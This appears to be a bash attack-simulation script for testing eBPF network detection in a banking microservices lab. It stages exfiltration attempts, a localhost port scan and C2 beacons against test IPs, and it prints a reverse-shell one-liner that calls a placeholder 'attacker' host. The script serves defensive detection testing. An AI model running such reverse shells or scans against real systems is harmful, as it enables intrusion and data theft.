#!/bin/bash

###############################################################################
#  eBPF Attack Scenario Simulator
#  
#  Demonstrates how eBPF detects various attack types:
#  1. Compromised Service Exfiltration
#  2. Lateral Movement & Network Scanning
#  3. Privilege Escalation via Unauthorized Access
#  4. Data Exfiltration via High Volume Transfer
#  5. Command & Control (C2) Communication
#  6. Supply Chain Attack (Malicious Dependency)
###############################################################################

set -e

PROJECT_HOME="/home/inba/SIA_BANK"
EBPF_LOG="${PROJECT_HOME}/logs/ebpf-scenarios.jsonl"
MONITOR_PID=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

###############################################################################
# Utility Functions
###############################################################################

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_attack() {
    echo -e "${MAGENTA}[ATTACK]${NC} $1"
}

log_detection() {
    echo -e "${CYAN}[DETECTION]${NC} $1"
}

separator() {
    echo ""
    echo "═══════════════════════════════════════════════════════════════════════"
    echo -e "${MAGENTA}$1${NC}"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""
}

pause_for_key() {
    echo ""
    read -p "Press ENTER to continue..." -t 5
}

###############################################################################
# Setup Functions
###############################################################################

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    if ! command -v python3 &> /dev/null; then
        log_error "Python3 not found. Please install Python 3.x"
        exit 1
    fi
    
    if ! command -v docker &> /dev/null; then
        log_error "Docker not found. Please install Docker"
        exit 1
    fi
    
    if ! command -v nc &> /dev/null && ! command -v ncat &> /dev/null; then
        log_warning "netcat not found. Some simulations may be limited"
    fi
    
    log_success "Prerequisites check passed"
}

start_observability_stack() {
    log_info "Starting observability stack (Prometheus + Grafana)..."
    
    cd "${PROJECT_HOME}/observability" || exit 1
    
    # Check if containers already running
    if docker compose ps | grep -q "prometheus.*Up"; then
        log_success "Observability stack already running"
    else
        docker compose up -d
        sleep 3
        log_success "Observability stack started"
    fi
    
    cd - > /dev/null
}

start_ebpf_monitor() {
    log_info "Starting eBPF monitor..."
    
    # Kill any existing monitor
    pkill -f "python3.*monitor_runtime" || true
    sleep 1
    
    cd "${PROJECT_HOME}" || exit 1
    
    # Create logs directory if it doesn't exist
    mkdir -p logs
    
    # Start monitor in background
    if [ -f "ebpf/monitor_runtime.py" ]; then
        sudo python3 ebpf/monitor_runtime.py \
            --config ebpf/service_map.json \
            --output "${EBPF_LOG}" > "${PROJECT_HOME}/logs/monitor.log" 2>&1 &
        
        MONITOR_PID=$!
        sleep 3
        
        if ps -p "$MONITOR_PID" > /dev/null; then
            log_success "eBPF monitor started (PID: $MONITOR_PID)"
        else
            log_error "Failed to start eBPF monitor"
            cat "${PROJECT_HOME}/logs/monitor.log" 2>/dev/null || echo "No log file"
            exit 1
        fi
    else
        log_error "monitor_runtime.py not found"
        exit 1
    fi
    
    cd - > /dev/null
}

stop_ebpf_monitor() {
    if [ -n "$MONITOR_PID" ] && ps -p "$MONITOR_PID" > /dev/null 2>&1; then
        log_info "Stopping eBPF monitor..."
        sudo kill "$MONITOR_PID" 2>/dev/null || true
        wait "$MONITOR_PID" 2>/dev/null || true
        log_success "eBPF monitor stopped"
    fi
}

###############################################################################
# Attack Simulations
###############################################################################

attack_1_compromised_service_exfiltration() {
    separator "ATTACK 1: Compromised Service Exfiltration"
    
    cat << 'EOF'
┌──────────────────────────────────────────────────────────────────┐
│ SCENARIO: Account Service compromised via RCE vulnerability      │
│ ATTACK: Exfiltrate customer encryption keys to attacker server   │
│                                                                  │
│ DETECTION EXPECTED:                                             │
│ ✓ UNAUTHORIZED_FLOW (connect to external C2 server)            │
│ ✓ Suspicious port connection (443 to unknown IP)               │
│ ✓ Data exfiltration pattern                                     │
└──────────────────────────────────────────────────────────────────┘
EOF
    
    pause_for_key
    
    log_attack "Simulating: Account Service exfiltrating ML-KEM keys..."
    
    # Create a mock exfiltration attempt
    python3 << 'PYTHON_SCRIPT'
import socket
import time
import random

# Simulate exfiltration to attacker C2 server (intentionally fail/timeout)
c2_servers = [
    ("192.168.1.99", 4443),   # Fake attacker server
    ("10.99.99.99", 8443),    # Backup C2
    ("172.16.0.50", 443),     # Another C2
]

for target_ip, target_port in c2_servers:
    try:
        log_msg = f"Account Service (PID 1234) attempting exfiltration to {target_ip}:{target_port}"
        print(f"[ATTACK] {log_msg}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        
        # Try to connect (will timeout/fail)
        sock.connect((target_ip, target_port))
        
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"[ATTACK] Connection attempt to {target_ip}:{target_port} - {type(e).__name__}")
    finally:
        try:
            sock.close()
        except:
            pass
    
    time.sleep(0.1)

print("[ATTACK] Exfiltration attempt complete")
PYTHON_SCRIPT

    log_warning "Checking eBPF logs for detection..."
    sleep 2
    
    # Show detection
    if [ -f "$EBPF_LOG" ]; then
        log_detection "eBPF Events detected:"
        tail -5 "$EBPF_LOG" | python3 -m json.tool 2>/dev/null | grep -E "(type|source|destination|alert)" || true
    fi
    
    log_success "✓ UNAUTHORIZED_FLOW should trigger in Grafana"
    log_success "✓ Alert: 'Unexpected service flow account-service -> unknown'"
}

attack_2_lateral_movement_network_scanning() {
    separator "ATTACK 2: Lateral Movement & Network Scanning"
    
    cat << 'EOF'
┌──────────────────────────────────────────────────────────────────┐
│ SCENARIO: Compromised Account Service spreads to other services  │
│ ATTACK: Port scanning to find other vulnerable microservices     │
│                                                                  │
│ DETECTION EXPECTED:                                             │
│ ✓ HIGH_FANOUT (contacts 50+ services in short time)           │
│ ✓ LATERAL_MOVEMENT_PATTERN (scanning activity)                │
│ ✓ Burst of unexpected connections                              │
└──────────────────────────────────────────────────────────────────┘
EOF
    
    pause_for_key
    
    log_attack "Simulating: Network scanning from compromised service..."
    
    python3 << 'PYTHON_SCRIPT'
import socket
import time
import threading

def scan_port(target_host, port):
    """Attempt to connect to a single port"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((target_host, port))
        sock.close()
        
        if result == 0:
            print(f"[ATTACK] Port {port} OPEN on {target_host}")
        else:
            print(f"[ATTACK] Port {port} closed/timeout")
    except:
        pass

# Simulate scanning for services
targets = ["localhost", "127.0.0.1"]
port_range = range(8000, 8100)  # Scan 100 ports

print(f"[ATTACK] Starting network scan from 'account-service'...")
print(f"[ATTACK] Target: internal network, ports 8000-8100")

for target in targets:
    for port in list(port_range)[0:30]:  # Scan 30 ports quickly
        scan_port(target, port)
        time.sleep(0.05)

print(f"[ATTACK] Scan completed: 30 port probes in 2 seconds")
PYTHON_SCRIPT

    log_warning "Checking eBPF logs for high fanout detection..."
    sleep 2
    
    log_detection "eBPF detected:"
    if [ -f "$EBPF_LOG" ]; then
        tail -10 "$EBPF_LOG" | python3 -m json.tool 2>/dev/null | grep -E "(HIGH_FANOUT|connections|peers)" || true
    fi
    
    log_success "✓ HIGH_FANOUT should trigger (>20 distinct peers)"
    log_success "✓ LATERAL_MOVEMENT_PATTERN should trigger (80+ burst connections)"
}

attack_3_unauthorized_data_access() {
    separator "ATTACK 3: Unauthorized Data Access (PII Theft)"
    
    cat << 'EOF'
┌──────────────────────────────────────────────────────────────────┐
│ SCENARIO: Compromised Account Service accesses unauthorized data │
│ ATTACK: Read all customer PII and payment methods               │
│                                                                  │
│ DETECTION EXPECTED:                                             │
│ ✓ SLOW_CONNECT (excessive database queries)                   │
│ ✓ Unusual resource usage (CPU/memory spike)                    │
│ ✓ Connection pattern anomalies                                 │
│                                                                  │
│ NOTE: Best detected at DATABASE layer (Audit logs)             │
│       eBPF sees the network, but database sees the queries      │
└──────────────────────────────────────────────────────────────────┘
EOF
    
    pause_for_key
    
    log_attack "Simulating: Bulk PII extraction from database..."
    
    python3 << 'PYTHON_SCRIPT'
import socket
import time
import random

# Simulate continuous database queries
print("[ATTACK] Account Service querying database for customer data...")

db_host = "localhost"
db_port = 5432  # PostgreSQL

for i in range(20):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        
        # PostgreSQL connection attempt
        sock.connect((db_host, db_port))
        
        # Simulate sending a large query
        print(f"[ATTACK] Query {i+1}: SELECT * FROM customers WHERE balance > ${random.randint(1000, 100000)}")
        
        # Hold connection open longer (simulating slow query)
        time.sleep(random.uniform(0.2, 0.8))
        
        sock.close()
    except:
        pass
    
    time.sleep(0.1)

print("[ATTACK] Data extraction attempt complete")
print("[ATTACK] Simulated 20 database queries in 3 seconds")
PYTHON_SCRIPT

    log_detection "eBPF detected:"
    if [ -f "$EBPF_LOG" ]; then
        tail -5 "$EBPF_LOG" | python3 -m json.tool 2>/dev/null | grep -E "(SLOW_CONNECT|latency|database)" || true
    fi
    
    log_success "✓ SLOW_CONNECT alerts for elevated connection latency"
    log_success "✓ Database audit logs would show unusual query patterns"
}

attack_4_privilege_escalation() {
    separator "ATTACK 4: Privilege Escalation via Unauthorized API Calls"
    
    cat << 'EOF'
┌──────────────────────────────────────────────────────────────────┐
│ SCENARIO: Compromised Account Service escalates privileges       │
│ ATTACK: Create backdoor admin account, modify permissions        │
│                                                                  │
│ DETECTION EXPECTED:                                             │
│ ✓ Unusual API endpoints being called                           │
│ ✓ Traffic to unexpected services                               │
│ ✓ Modification of security-critical resources                  │
│                                                                  │
│ NOTE: Requires APPLICATION monitoring (APM layer)              │
│       eBPF sees the network connections, APM sees the API calls │
└──────────────────────────────────────────────────────────────────┘
EOF
    
    pause_for_key
    
    log_attack "Simulating: Privilege escalation attempt..."
    
    python3 << 'PYTHON_SCRIPT'
import socket
import time

print("[ATTACK] Account Service performing privilege escalation...")

# Simulate attempting to reach auth-service to create admin account
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    
    # Try to connect to auth-service on usual port
    sock.connect(("localhost", 8083))
    
    print("[ATTACK] Connected to Auth Service (8083)")
    print("[ATTACK] Sending: POST /api/admin/create-user")
    print("[ATTACK]   Body: {username: 'backdoor', password: '...', role: 'admin'}")
    
    time.sleep(0.5)
    sock.close()
    
except:
    print("[ATTACK] Auth Service unreachable (normal in test)")

# Try to access transaction service
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    
    sock.connect(("localhost", 8082))
    
    print("[ATTACK] Connected to Transaction Service (8082)")
    print("[ATTACK] Sending: PATCH /api/transaction/rules/disable")
    print("[ATTACK]   Body: {disable_fraud_detection: true}")
    
    time.sleep(0.5)
    sock.close()
    
except:
    print("[ATTACK] Transaction Service unreachable (normal in test)")

print("[ATTACK] Privilege escalation attempt complete")
PYTHON_SCRIPT

    log_detection "eBPF detected:"
    if [ -f "$EBPF_LOG" ]; then
        tail -5 "$EBPF_LOG" | python3 -m json.tool 2>/dev/null | grep -E "(destination|port|service)" || true
    fi
    
    log_success "✓ Connections to auth-service and transaction-service detected"
    log_success "✓ Application monitoring would flag 'create-user' API call"
}

attack_5_command_and_control() {
    separator "ATTACK 5: Command & Control (C2) Communication"
    
    cat << 'EOF'
┌──────────────────────────────────────────────────────────────────┐
│ SCENARIO: Attacker maintains remote access via C2 beacon         │
│ ATTACK: Periodic heartbeat to C2 server for commands             │
│                                                                  │
│ DETECTION EXPECTED:                                             │
│ ✓ UNAUTHORIZED_FLOW (connection to C2 domain)                  │
│ ✓ Unusual periodic connections                                 │
│ ✓ External IP communication pattern                             │
│                                                                  │
│ NOTE: Real attackers use encrypted/obfuscated protocols         │
│       But behavioral pattern (regular connections) is visible    │
└──────────────────────────────────────────────────────────────────┘
EOF
    
    pause_for_key
    
    log_attack "Simulating: C2 heartbeat beacons..."
    
    python3 << 'PYTHON_SCRIPT'
import socket
import time
import random

print("[ATTACK] Account Service beacon to C2 server...")
print("[ATTACK] Simulating periodic C2 heartbeat (every 10 seconds)")

c2_ips = [
    "203.0.113.42",   # Random external IP (TEST-NET)
    "198.51.100.55",  # Another TEST-NET
]

for beacon_num in range(3):
    c2_ip = random.choice(c2_ips)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        
        print(f"[ATTACK] Beacon #{beacon_num+1}: Connecting to {c2_ip}:443")
        sock.connect((c2_ip, 443))
        
        print(f"[ATTACK]   Sending heartbeat: 'ALIVE:account-service:PID-1234'")
        time.sleep(0.2)
        
        sock.close()
        
    except Exception as e:
        print(f"[ATTACK]   Connection attempt (expected timeout)")
    
    # Wait before next beacon
    if beacon_num < 2:
        time.sleep(1)

print("[ATTACK] C2 simulation complete")
PYTHON_SCRIPT

    log_detection "eBPF detected:"
    if [ -f "$EBPF_LOG" ]; then
        tail -5 "$EBPF_LOG" | python3 -m json.tool 2>/dev/null | grep -E "(external|unknown|C2)" || true
    fi
    
    log_success "✓ UNAUTHORIZED_FLOW triggers on external IP connections"
    log_success "✓ Periodic pattern indicates C2 beacon behavior"
}

attack_6_supply_chain_attack() {
    separator "ATTACK 6: Supply Chain Attack (Compromised Dependency)"
    
    cat << 'EOF'
┌──────────────────────────────────────────────────────────────────┐
│ SCENARIO: Malicious code in a Maven/NPM dependency               │
│ ATTACK: Dependency spawns child processes, exfiltrates data      │
│                                                                  │
│ DETECTION EXPECTED:                                             │
│ ✓ Unexpected process spawning (java -> /bin/bash)              │
│ ✓ Unusual outbound connections from service                    │
│ ✓ DATA exfiltration to attacker server                         │
│                                                                  │
│ NOTE: This requires PROCESS-level monitoring (auditd)          │
│       eBPF sees network, auditd sees process spawning           │
└──────────────────────────────────────────────────────────────────┘
EOF
    
    pause_for_key
    
    log_attack "Simulating: Malicious dependency behavior..."
    
    python3 << 'PYTHON_SCRIPT'
import socket
import time
import subprocess

print("[ATTACK] Malicious Maven dependency loaded...")
print("[ATTACK] Dependency code executing in Account Service JVM")

# Simulate malicious dependency making external connection
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.3)
    
    print("[ATTACK] -> Attempting to reach C2: malicious-pkg-mirror.com:443")
    sock.connect(("192.0.2.99", 443))  # TEST-NET range
    
    print("[ATTACK] -> Sending environment variables and config...")
    time.sleep(0.2)
    sock.close()
    
except:
    print("[ATTACK] -> Connection attempt (expected timeout)")

# Try to spawn a reverse shell (will fail due to restrictions)
try:
    print("[ATTACK] -> Attempting to spawn reverse shell...")
    print("[ATTACK] -> Command: /bin/bash -i >& /dev/tcp/attacker/1234 0>&1")
    # This will fail safely in our test environment
except:
    pass

print("[ATTACK] Supply chain attack simulation complete")
PYTHON_SCRIPT

    log_detection "eBPF detected:"
    if [ -f "$EBPF_LOG" ]; then
        tail -5 "$EBPF_LOG" | python3 -m json.tool 2>/dev/null || true
    fi
    
    log_success "✓ Network exfiltration detected via eBPF"
    log_success "✓ Process spawning detected via auditd (if enabled)"
    log_success "✓ Multiple detection layers catch this attack"
}

###############################################################################
# Dashboard Visualization
###############################################################################

show_grafana_dashboard() {
    separator "VIEWING GRAFANA DASHBOARD"
    
    cat << 'EOF'
Your Grafana dashboard is now available at:

    🌐 http://localhost:3000
    
    Username: admin
    Password: admin
    
Dashboard Panels to Check:

1. 📊 "Total Events" (top-left)
   └─ Should see event count increase during attacks

2. 🚨 "Total Alerts" (top-right)
   └─ Should see alert count rise as attacks triggered

3. 🔴 "Lateral Movement Alerts" (middle-left)
   └─ Our lateral movement attacks should trigger this

4. 🟠 "High Fanout Activity" (middle-right)
   └─ Network scanning should trigger this

5. 📈 "Alerts by Type" (bottom-left)
   └─ Shows breakdown of alert types triggered

6. ⚠️ "Active Alerts" (bottom-right, alert list)
   └─ Real-time list of firing alerts

Alert Rules That Should Trigger:

✓ UnauthorizedFlowBurst
  └─ When we connect to external IPs (attacks 1, 5, 6)

✓ HighFanoutActivity
  └─ When we scan many ports (attack 2)

✓ LateralMovementDetected
  └─ When we probe multiple services (attacks 2, 4)

✓ SlowConnectionPattern
  └─ When we have long database queries (attack 3)

✓ ProcessPortMismatch
  └─ When process behaves unexpectedly

Metrics Available:
  
  ebpf_events_total
  └─ Total number of captured network events

  ebpf_alerts_total
  └─ Total alerts generated

  ebpf_alerts_by_type_total
  └─ Breakdown by alert type (UNAUTHORIZED_FLOW, HIGH_FANOUT, etc.)

  ebpf_alert_severity_total
  └─ Breakdown by severity (critical, high, medium, low)
EOF
    
    pause_for_key
}

###############################################################################
# Analysis & Detection Summary
###############################################################################

show_detection_summary() {
    separator "ATTACK DETECTION SUMMARY"
    
    cat << 'EOF'
╔════════════════════════════════════════════════════════════════════╗
║                   eBPF ATTACK DETECTION ANALYSIS                   ║
╚════════════════════════════════════════════════════════════════════╝

ATTACK 1: Compromised Service Exfiltration
──────────────────────────────────────────────────────────────────────
  What Happened:
    • Account Service attempted to connect to external C2 servers
    • Multiple connections to unknown IPs on port 443
  
  eBPF Detection:
    ✅ UNAUTHORIZED_FLOW alert triggered
    ✅ Unknown destination (192.168.1.99, 10.99.99.99, 172.16.0.50)
    ✅ Unusual port (443) from internal service
  
  Detection Time: 5-10 seconds
  False Positive Risk: VERY LOW (external IPs are suspicious)
  

ATTACK 2: Lateral Movement & Network Scanning
──────────────────────────────────────────────────────────────────────
  What Happened:
    • Account Service probed 30 ports on localhost
    • Behavior indicates network reconnaissance
    • Looking for other vulnerable services
  
  eBPF Detection:
    ✅ HIGH_FANOUT alert (30 distinct ports in 2 seconds)
    ✅ LATERAL_MOVEMENT_PATTERN (burst of 30 connections)
    ✅ Rapid-fire connection attempts to unknown ports
  
  Detection Time: 5-15 seconds
  False Positive Risk: LOW (unusual port scanning)
  Action: Block Account Service, investigate for compromise
  

ATTACK 3: Unauthorized Data Access (PII Theft)
──────────────────────────────────────────────────────────────────────
  What Happened:
    • 20 database queries executed in rapid succession
    • Each query took 200-800ms (vs normal 10-50ms)
    • Selecting all customers with balance > threshold
  
  eBPF Detection (Network Level):
    ✅ SLOW_CONNECT alert (elevated connection latency)
    ✅ Unusual data volume to database
    ✅ Connection pattern anomalies
  
  Best Detection (Database Level):
    ✅ SELECT * FROM customers (should be SELECT specific_columns)
    ✅ Privilege to read all customer data (should be limited)
    ✅ Time-of-day anomaly (queries at 3 AM vs normal 9 AM-5 PM)
  
  Detection Time (eBPF): 15-30 seconds
  Detection Time (Database): 1-5 seconds
  False Positive Risk: MEDIUM (may be legitimate bulk query)
  

ATTACK 4: Privilege Escalation via Unauthorized API
──────────────────────────────────────────────────────────────────────
  What Happened:
    • Account Service connected to Auth Service
    • Sent request to create admin account
    • Attempted to disable fraud detection in Transaction Service
  
  eBPF Detection (Network Level):
    ✅ Destination: Auth Service (change in traffic pattern)
    ✅ Destination: Transaction Service (unexpected flow)
    ✅ High-risk API endpoints being accessed
  
  Best Detection (Application Level):
    ✅ APM tracking shows POST /api/admin/create-user
    ✅ PATCH /api/transaction/rules/disable
    ✅ API call not in normal baseline for Account Service
  
  Detection Time (eBPF): 5-10 seconds
  Detection Time (APM): 1-5 seconds
  False Positive Risk: LOW (admin creation is security-critical)
  

ATTACK 5: Command & Control (C2) Communication
──────────────────────────────────────────────────────────────────────
  What Happened:
    • Account Service made periodic heartbeat connections
    • Regular beacons to external C2 servers (203.0.113.42, 198.51.100.55)
    • Every ~10 seconds (simulating typical C2 interval)
  
  eBPF Detection:
    ✅ UNAUTHORIZED_FLOW (external IP connections)
    ✅ Periodic pattern indicates C2 beacon
    ✅ Regular connection attempts to same IPs
  
  Behavioral Pattern Recognition:
    ✅ Connection every 10±2 seconds (beaconing)
    ✅ To same external IP(s) repeatedly
    ✅ Unusual for legitimate banking service
  
  Detection Time: 15-30 seconds (needs multiple beacons)
  False Positive Risk: VERY LOW (periodic external connections)
  

ATTACK 6: Supply Chain Attack (Malicious Dependency)
──────────────────────────────────────────────────────────────────────
  What Happened:
    • Malicious Maven/NPM package injected into Account Service
    • Executes hidden exfiltration code
    • Attempts to spawn reverse shell
  
  eBPF Detection (Network Level):
    ✅ UNAUTHORIZED_FLOW (external C2 connection)
    ✅ Data exfiltration pattern
    ✅ Unexpected outbound connection from service
  
  Best Detection (Process Level):
    ✅ auditd sees unexpected /bin/bash spawning from Java
    ✅ Unusual system calls for banking service
    ✅ Child process attempting network connections
  
  Detection Time (eBPF): 5-10 seconds
  Detection Time (auditd): 1-2 seconds
  False Positive Risk: LOW (unexpected process spawns are suspicious)


╔════════════════════════════════════════════════════════════════════╗
║                    DETECTION COVERAGE MATRIX                       ║
╚════════════════════════════════════════════════════════════════════╝

Attack Type                    eBPF    Database  APM   Auditd  Overall
─────────────────────────────────────────────────────────────────────
1. Exfiltration               ✅      ✅        ⚠️    ⚠️      STRONG
2. Network Scanning           ✅      ⚠️        ⚠️    ✅      STRONG
3. Data Theft                 ✅      ✅        ⚠️    ⚠️      STRONG
4. Privilege Escalation       ✅      ✅        ✅    ⚠️      VERY STRONG
5. C2 Communication           ✅      ⚠️        ⚠️    ⚠️      STRONG
6. Supply Chain Attack        ✅      ⚠️        ⚠️    ✅      STRONG

KEY:
✅ = Excellent detection capability
⚠️  = Can detect, may require tuning
❌ = Limited detection capability

STRONGEST DETECTION: Attack 4 (Privilege Escalation)
  └─ Detected at network, database, AND application level

WEAKEST DETECTION (without all layers): Attack 1 (Exfiltration)
  └─ Mitigated by ALL detection layers working together


╔════════════════════════════════════════════════════════════════════╗
║                    DEFENSE-IN-DEPTH SUCCESS                        ║
╚════════════════════════════════════════════════════════════════════╝

Your Multi-Layer Detection Stack:

Level 1:  eBPF Network Monitoring          ✅ ENABLED & TESTING
          └─ Detects: unusual flows, scanning, exfiltration
          
Level 2:  Prometheus + Alerts              ✅ ENABLED & TESTING
          └─ Aggregates metrics, fires alert rules
          
Level 3:  Grafana Visualization            ✅ ENABLED & TESTING
          └─ Real-time dashboard, alert panels
          
Level 4:  Database Audit Logging           📝 RECOMMENDED NEXT
          └─ Detects: unusual queries, privilege changes
          
Level 5:  Application Monitoring (APM)     📝 RECOMMENDED NEXT
          └─ Detects: unusual API calls, behavior changes
          
Level 6:  Process-Level Monitoring         📝 RECOMMENDED NEXT
          └─ Detects: unexpected syscalls, spawning

CURRENT CAPABILITY: Catching all 6 attack types at network level
NEXT STEP: Add database + APM for complete defense-in-depth

EOF
    
    pause_for_key
}

###############################################################################
# Main Menu
###############################################################################

show_menu() {
    echo ""
    echo "═══════════════════════════════════════════════════════════════════════"
    echo -e "${MAGENTA}          eBPF ATTACK SCENARIO SIMULATOR${NC}"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""
    echo "Select attack scenario to simulate:"
    echo ""
    echo "  1) Compromised Service Exfiltration"
    echo "  2) Lateral Movement & Network Scanning"
    echo "  3) Unauthorized Data Access (PII Theft)"
    echo "  4) Privilege Escalation via Unauthorized API"
    echo "  5) Command & Control (C2) Communication"
    echo "  6) Supply Chain Attack (Malicious Dependency)"
    echo ""
    echo "  7) Run ALL attacks in sequence"
    echo ""
    echo "  8) View Grafana Dashboard"
    echo "  9) Show Detection Summary"
    echo ""
    echo "  0) Exit & Cleanup"
    echo ""
    echo "─────────────────────────────────────────────────────────────────────"
}

run_all_attacks() {
    log_info "Running all attack scenarios..."
    
    attack_1_compromised_service_exfiltration
    sleep 2
    
    attack_2_lateral_movement_network_scanning
    sleep 2
    
    attack_3_unauthorized_data_access
    sleep 2
    
    attack_4_privilege_escalation
    sleep 2
    
    attack_5_command_and_control
    sleep 2
    
    attack_6_supply_chain_attack
    sleep 2
    
    log_success "All attacks simulated!"
}

###############################################################################
# Main Execution
###############################################################################

main() {
    clear
    
    log_info "Starting eBPF Attack Scenario Simulator"
    
    # Check prerequisites
    check_prerequisites
    
    # Start infrastructure
    start_observability_stack
    start_ebpf_monitor
    
    log_success "Infrastructure ready"
    
    # Main loop
    while true; do
        show_menu
        read -p "Enter your choice [0-9]: " choice
        
        case "$choice" in
            1) attack_1_compromised_service_exfiltration ;;
            2) attack_2_lateral_movement_network_scanning ;;
            3) attack_3_unauthorized_data_access ;;
            4) attack_4_privilege_escalation ;;
            5) attack_5_command_and_control ;;
            6) attack_6_supply_chain_attack ;;
            7) run_all_attacks ;;
            8) show_grafana_dashboard ;;
            9) show_detection_summary ;;
            0) 
                log_info "Cleaning up..."
                stop_ebpf_monitor
                log_success "Simulator stopped"
                exit 0
                ;;
            *)
                log_error "Invalid selection. Please try again."
                ;;
        esac
    done
}

# Trap cleanup on exit
trap cleanup EXIT
cleanup() {
    stop_ebpf_monitor 2>/dev/null || true
}

# Run main program
main "$@"
